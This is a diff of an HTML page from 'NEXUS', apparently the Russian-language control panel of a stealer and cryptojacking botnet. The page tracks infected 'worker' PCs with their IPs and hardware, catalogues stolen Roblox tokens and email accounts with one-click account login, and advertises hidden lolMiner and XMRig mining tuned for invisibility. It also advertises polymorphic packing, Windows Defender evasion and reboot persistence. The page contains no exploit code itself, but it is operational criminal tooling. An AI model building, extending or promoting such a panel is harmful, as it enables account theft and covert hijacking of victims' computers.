@@ -5,15 +5,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="theme-color" content="#080b12">
   <meta name="color-scheme" content="dark">
-  <meta name="description" content="Операционный центр NEXUS для мониторинга воркеров и сессий.">
-  <title>NEXUS — Панель управления</title>
+  <meta name="description" content="Главная панель управления командного центра NEXUS.">
+  <title>NEXUS — Главная</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="assets/style.css?v=300">
-  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <link rel="stylesheet" href="assets/style.css?v=301">
 </head>
-<body data-page="files">
+<body data-page="home">
   <div class="sidebar-layout">
     <div id="sidebarSlot"></div>
     
@@ -21,184 +20,207 @@
       <!-- Top Bar -->
       <div class="top-bar">
         <div class="page-heading">
-          <div class="page-eyebrow">Операционный центр</div>
-          <h1 class="page-title">Воркеры и сессии</h1>
-          <p class="page-subtitle">Мониторинг подключений, состояния клиентов и активности системы.</p>
+          <div class="page-eyebrow">Командный центр</div>
+          <h1 class="page-title">Главная</h1>
+          <p class="page-subtitle">Единый операционный пульт управления распределенной сетью NEXUS.</p>
         </div>
 
-        <div class="status-indicator" id="workerStatusIndicator" style="display: none;">
+        <div class="status-indicator">
           <span class="dot"></span>
-          <span>Воркеры онлайн</span>
+          <span>Система активна • Core v8.0.0</span>
         </div>
       </div>
 
-      <!-- KPI Stats Grid -->
+      <!-- Hero Welcome Banner -->
+      <div class="home-hero-card">
+        <div class="home-hero-glow"></div>
+        <div class="home-hero-content">
+          <div class="home-hero-badge">
+            <span class="home-badge-dot"></span>
+            <span>NEXUS OPERATIONAL HUB</span>
+          </div>
+          <h2 class="home-hero-title">
+            Добро пожаловать, <span class="home-accent-name" id="homeOpName">Оператор</span>
+          </h2>
+          <p class="home-hero-desc">
+            Централизованная панель мониторинга распределённых клиентов, управления вычислительными модулями Dual-Mining (lolMiner & XMRig), автоматического сбора сессий и оперативной связи.
+          </p>
+          <div class="home-hero-actions">
+            <a href="workers.html" class="btn-primary">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="9"></rect><rect x="14" y="3" width="7" height="5"></rect><rect x="14" y="12" width="7" height="9"></rect><rect x="3" y="16" width="7" height="5"></rect></svg>
+              <span>Воркеры и сессии</span>
+            </a>
+            <a href="tokens.html" class="btn-secondary">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path></svg>
+              <span>База аккаунтов</span>
+            </a>
+            <button type="button" class="btn-secondary" onclick="openOperatorChat('full')">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
+              <span>Служебный чат</span>
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Live KPI Bar -->
       <div class="stats-bar">
-        <div class="stat-card">
-          <div class="stat-label">Roblox Аккаунтов</div>
-          <div class="stat-value" id="sRoblox">—</div>
+        <div class="stat-card" onclick="location.href='workers.html'" style="cursor: pointer;" title="Перейти к воркерам">
+          <div class="stat-label">Подключенных ПК</div>
+          <div class="stat-value" id="homePcCount">—</div>
         </div>
 
-        <div class="stat-card">
-          <div class="stat-label">Компьютеров</div>
-          <div class="stat-value" id="sPCs">—</div>
+        <div class="stat-card" onclick="location.href='tokens.html'" style="cursor: pointer;" title="Перейти к базе аккаунтов">
+          <div class="stat-label">Roblox Аккаунтов</div>
+          <div class="stat-value" id="homeTokenCount">—</div>
+        </div>
+
+        <div class="stat-card" onclick="location.href='updates.html'" style="cursor: pointer;" title="Вычислительный модуль">
+          <div class="stat-label">Compute Engine</div>
+          <div class="stat-value" style="color: var(--accent); font-size: 1.35rem;">Dual Mining</div>
+          <div style="font-size: 0.75rem; color: var(--text-muted); margin-top: 2px;">lolMiner + XMRig</div>
         </div>
 
         <div class="stat-card">
           <div class="stat-label">Последняя активность</div>
-          <div class="stat-value" id="sLast" style="font-size: 1.1rem; line-height: 1.4; color: var(--text-secondary);">—</div>
+          <div class="stat-value" id="homeLastActivity" style="font-size: 1.1rem; line-height: 1.4; color: var(--text-secondary);">—</div>
+        </div>
+      </div>
+
+      <!-- Quick Launch Modules -->
+      <div class="home-section">
+        <div class="home-section-header">
+          <h3 class="home-section-title">Быстрый доступ к разделам</h3>
+          <span class="home-section-sub">Основные инструменты операционного центра</span>
         </div>
 
-        <div class="stat-card action-card" id="updateAllCard">
-          <div class="stat-label" id="updateAllLabel">Обновление</div>
-          <div style="display: flex; align-items: baseline; gap: 6px; margin: 0.2rem 0;">
-            <span class="stat-value" id="updateAllCount">0</span>
-            <span style="font-size: 0.85rem; color: var(--text-muted);" id="updateAllUnit">ПК</span>
-          </div>
-          <div id="updateAllSubtext" style="font-size: 0.75rem; color: var(--text-muted);">
-            Нажмите для обновления
+        <div class="home-modules-grid">
+          <a href="workers.html" class="home-module-card">
+            <div class="home-module-icon-wrap" style="color: #38bdf8;">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+            </div>
+            <div class="home-module-info">
+              <div class="home-module-title">Воркеры и сессии</div>
+              <div class="home-module-desc">Мониторинг удалённых машин, телеметрия оборудования (CPU, RAM, GPU) и удалённые команды.</div>
+            </div>
+            <div class="home-module-foot">
+              <span>Открыть воркеры</span>
+              <span class="home-arrow">→</span>
+            </div>
+          </a>
+
+          <a href="tokens.html" class="home-module-card">
+            <div class="home-module-icon-wrap" style="color: #34d399;">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path></svg>
+            </div>
+            <div class="home-module-info">
+              <div class="home-module-title">База аккаунтов</div>
+              <div class="home-module-desc">Каталог обнаруженных учетных записей, балансов Robux, проверка инвентаря и вход в 1 клик.</div>
+            </div>
+            <div class="home-module-foot">
+              <span>К списку токенов</span>
+              <span class="home-arrow">→</span>
+            </div>
+          </a>
+
+          <a href="bookmarks.html" class="home-module-card">
+            <div class="home-module-icon-wrap" style="color: #fbbf24;">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path></svg>
+            </div>
+            <div class="home-module-info">
+              <div class="home-module-title">Пометки по играм</div>
+              <div class="home-module-desc">Группировка токенов по целевым играм: Murder Mystery 2, Adopt Me, Steal a Brainrot.</div>
+            </div>
+            <div class="home-module-foot">
+              <span>Управление пометками</span>
+              <span class="home-arrow">→</span>
+            </div>
+          </a>
+
+          <a href="updates.html" class="home-module-card">
+            <div class="home-module-icon-wrap" style="color: #a78bfa;">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
+            </div>
+            <div class="home-module-info">
+              <div class="home-module-title">Центр обновлений</div>
+              <div class="home-module-desc">История версий, журнал изменений компонентов, загрузка сборок и проверка целостности.</div>
+            </div>
+            <div class="home-module-foot">
+              <span>Смотреть релизы</span>
+              <span class="home-arrow">→</span>
+            </div>
+          </a>
+        </div>
+      </div>
+
+      <!-- Compute Architecture Overview -->
+      <div class="home-section">
+        <div class="home-section-header">
+          <h3 class="home-section-title">Вычислительный кластер NEXUS</h3>
+          <span class="home-section-sub">Архитектура распределенного фонового ядра вычислений</span>
+        </div>
+
+        <div class="home-compute-card">
+          <div class="home-compute-grid">
+            <div class="home-compute-item">
+              <div class="home-compute-head">
+                <span class="home-compute-tag gpu">GPU PRIMARY</span>
+                <span class="home-compute-status online">Интегрирован</span>
+              </div>
+              <h4 class="home-compute-name">lolMiner 1.98a Engine</h4>
+              <p class="home-compute-detail">
+                Высокоэффективный майнинг на видеокартах NVIDIA & AMD. Поддерживаемые алгоритмы: Autolykos2 (ERG), KawPow (RVN), FishHash (IronFish/ETC). Низкая нагрузка на шину PCIe и stealth-режим.
+              </p>
+            </div>
+
+            <div class="home-compute-item">
+              <div class="home-compute-head">
+                <span class="home-compute-tag cpu">CPU SECONDARY</span>
+                <span class="home-compute-status online">Интегрирован</span>
+              </div>
+              <h4 class="home-compute-name">XMRig 6.22.2 Engine</h4>
+              <p class="home-compute-detail">
+                Процессорный вычислительный модуль для алгоритма RandomX (Monero XMR) и GhostRider. Автоматическая регулировка числа ядер при пользовательской активности для полной невидимости.
+              </p>
+            </div>
+
+            <div class="home-compute-item">
+              <div class="home-compute-head">
+                <span class="home-compute-tag security">STEALTH & GUARD</span>
+                <span class="home-compute-status secure">Активно</span>
+              </div>
+              <h4 class="home-compute-name">Resource Guardian & Evasion</h4>
+              <p class="home-compute-detail">
+                Полиморфная упаковка, защита памяти от дампа, обход поведенческого анализа Windows Defender и автоматическое восстановление после перезагрузки рабочей станции.
+              </p>
+            </div>
           </div>
         </div>
       </div>
 
-      <!-- Search & Filters Control Bar -->
-      <div class="controls-panel">
-        <div class="search-bar-wrapper">
-          <div style="position: relative; width: 100%;">
-            <input 
-              type="text" 
-              class="search-input" 
-              id="searchBar" 
-              placeholder="Поиск по имени ПК или файлу..." 
-              oninput="filterFiles()"
-            >
+      <!-- Recent Active Workers -->
+      <div class="home-section">
+        <div class="home-section-header" style="display: flex; justify-content: space-between; align-items: center;">
+          <div>
+            <h3 class="home-section-title">Недавняя активность воркеров</h3>
+            <span class="home-section-sub">Последние подключившиеся клиенты</span>
           </div>
-
-          <select class="filter-select" id="sortFiles" onchange="filterFiles()">
-            <option value="date">По дате (новые)</option>
-            <option value="roblox">Сначала с токеном</option>
-            <option value="version">По версии</option>
-          </select>
+          <a href="workers.html" class="home-more-link">Смотреть все воркеры →</a>
         </div>
 
-        <div style="display: flex; gap: 8px;">
-          <button class="btn-refresh" onclick="loadFiles()">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.2"/></svg>
-            <span>Обновить</span>
-          </button>
-          
-          <button class="btn-secondary" id="btnRequestAll">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M17 8l-5-5-5 5M12 3v12"/></svg>
-            <span>Запросить у всех</span>
-          </button>
+        <div class="home-recent-card" id="homeRecentWorkersList">
+          <div class="skeleton" style="height: 56px; border-radius: 8px;"></div>
+          <div class="skeleton" style="height: 56px; border-radius: 8px; margin-top: 8px;"></div>
+          <div class="skeleton" style="height: 56px; border-radius: 8px; margin-top: 8px;"></div>
         </div>
       </div>
 
-      <!-- File Grid -->
-      <main class="files-grid" id="fileGrid">
-        <div class="skeleton" style="height: 200px;"></div>
-        <div class="skeleton" style="height: 200px;"></div>
-        <div class="skeleton" style="height: 200px;"></div>
-        <div class="skeleton" style="height: 200px;"></div>
-      </main>
     </main>
-  </div>
-
-  <!-- Details Modal -->
-  <div id="fileModal" class="modal-overlay" onclick="closeModal()">
-    <div class="modal-container" onclick="event.stopPropagation()">
-      <button class="modal-close" onclick="closeModal()" aria-label="Закрыть">✕</button>
-      
-      <div class="modal-content-wrapper" style="padding: 1.75rem; overflow-y: auto;">
-        <h3 class="modal-filename" id="modalFilename">Название файла</h3>
-        
-        <div style="display: flex; gap: 1.25rem; flex-wrap: wrap; margin-top: 1.25rem;">
-          
-          <!-- Left: Hardware Telemetry -->
-          <div class="modal-details-pane">
-            <div class="specs-section">
-              <h4 class="section-title">Характеристики системы</h4>
-              <div class="specs-grid">
-                <div class="spec-row"><span class="spec-lbl">Компьютер</span><span class="spec-val" id="specName">—</span></div>
-                <div class="spec-row"><span class="spec-lbl">Версия</span><span class="spec-val" id="specVersion">—</span></div>
-                <div class="spec-row"><span class="spec-lbl">IP-адрес</span><span class="spec-val" id="specIp">—</span></div>
-                <div class="spec-row"><span class="spec-lbl">ОС</span><span class="spec-val" id="specOs">—</span></div>
-                <div class="spec-row"><span class="spec-lbl">CPU</span><span class="spec-val" id="specCpu">—</span></div>
-                <div class="spec-row"><span class="spec-lbl">RAM</span><span class="spec-val" id="specRam">—</span></div>
-                <div class="spec-row"><span class="spec-lbl">GPU</span><span class="spec-val" id="specGpu">—</span></div>
-                <div class="spec-row"><span class="spec-lbl">Дата</span><span class="spec-val" id="specDate">—</span></div>
-              </div>
-            </div>
-          </div>
-          
-          <!-- Right: Roblox Account Info & Actions -->
-          <div class="modal-roblox-pane">
-            <div class="specs-section" id="robloxSpecsSection">
-              <h4 class="section-title">Roblox Аккаунт</h4>
-              <div class="specs-grid">
-                <div class="spec-row">
-                  <span class="spec-lbl">Никнейм</span>
-                  <span class="spec-val" id="robloxSpecUser" style="color: var(--success); font-weight: 600;">—</span>
-                </div>
-                <div class="spec-row" id="tokenStatusRow" style="display:none;">
-                  <span class="spec-lbl">Статус</span>
-                  <span class="spec-val" id="tokenStatusText" style="color: var(--danger); font-weight: 500;">—</span>
-                </div>
-                <div class="spec-row" id="tokenRequestRow">
-                  <span class="spec-lbl">Запрос токена</span>
-                  <span class="spec-val" id="tokenRequestStatus">—</span>
-                </div>
-              </div>
-            </div>
-
-            <div class="specs-section" id="emailsSection" style="display:none;">
-              <h4 class="section-title">Почтовые аккаунты</h4>
-              <div id="emailsList" style="max-height:140px; overflow-y:auto; display:flex; flex-direction:column; gap:4px; margin-top:4px;"></div>
-            </div>
-
-            <div class="modal-actions">
-              <button class="modal-btn" id="modalOpenBtn" style="background:#18181c; color:#fff; border:1px solid var(--border);">
-                Открыть токены
-              </button>
-              <button class="modal-btn" id="modalLoginBtn" style="background:var(--success-bg); color:var(--success); border:1px solid var(--success-border);">
-                Войти в аккаунт
-              </button>
-              <button class="modal-btn" id="modalRequestBtn" style="background:#18181c; color:var(--text-secondary); border:1px solid var(--border);">
-                Запросить токен
-              </button>
-              <button class="modal-btn" id="modalUpdateBtn" style="background:#18181c; color:var(--text-secondary); border:1px solid var(--border);">
-                Обновить клиент
-              </button>
-              <button class="modal-btn" id="modalEmailsBtn" style="background:#18181c; color:var(--text-secondary); border:1px solid var(--border);">
-                Почты
-              </button>
-              <button class="modal-btn del-btn" id="modalDeleteBtn">
-                Удалить
-              </button>
-            </div>
-
-          </div>
-
-        </div>
-      </div>
-    </div>
   </div>
 
   <div id="toast"></div>
 
-  <!-- Global Keyboard Shortcut: '/' or 'Ctrl+K' to focus search -->
-  <script>
-    window.addEventListener('keydown', function(e) {
-      if ((e.key === '/' || (e.ctrlKey && e.key === 'k')) && document.activeElement.tagName !== 'INPUT') {
-        e.preventDefault();
-        const s = document.getElementById('searchBar');
-        if (s) { s.focus(); s.select(); }
-      }
-    });
-  </script>
-
-  <script src="assets/config.js?v=300"></script>
-  <script src="assets/app.js?v=300"></script>
-  <script src="assets/dashboard.js?v=300"></script>
+  <script src="assets/config.js?v=301"></script>
+  <script src="assets/app.js?v=301"></script>
+  <script src="assets/home.js?v=301"></script>
 </body>
 </html>
